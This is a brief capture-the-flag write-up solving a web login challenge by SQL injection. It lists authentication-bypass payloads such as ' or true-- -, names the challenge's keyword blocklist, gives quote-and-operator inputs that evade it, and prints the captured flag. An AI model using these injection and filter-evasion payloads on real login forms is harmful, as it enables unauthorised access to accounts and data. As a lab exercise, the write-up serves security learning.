# 『The challenge』

We were given this template:

<img width="1898" height="913" alt="image" src="https://github.com/user-attachments/assets/5dcae26d-cf86-416d-a3d0-679fe471febd" />

Seems it is `SQL injection`, so lets solve!

# 『Solving challenge』
> Solve by: Lylera_

So this challenge is same as this one ([click me](https://github.com/Lunalight-Yui/CTF/tree/main/2025/HCS/Web%20Exploit/Lockpicking)). To bypass this one, use this:

```
Username: admin
Password: ' or true-- -
```

or

```
Username: ' or true--
Password: ' or true--
```

here the result:

<img width="1204" height="915" alt="image" src="https://github.com/user-attachments/assets/5e20c013-a171-4838-8f4e-1e3a9f5f7095" />

There are blocklist for this continue vault. The blocklist `or, and, union, select, from, where, information_schema, --, #`.

We can't use like `or, and, union` right? nope. we can use this: `'-'` to bypass a simple way. Use that we're given the flags

Or you want something else, use this list:

```
'&'
'^'
'*'
```

# 『Flag』

So here the result:

<img width="563" height="614" alt="image" src="https://github.com/user-attachments/assets/3d9a1ed8-dcf6-4877-934f-964e3a414046" />

```
Flag: compit{d1d_y0u_just_unl0ck_th1s_v4ult?_c0ngr4tz_th3n_y0u_th13f}
```
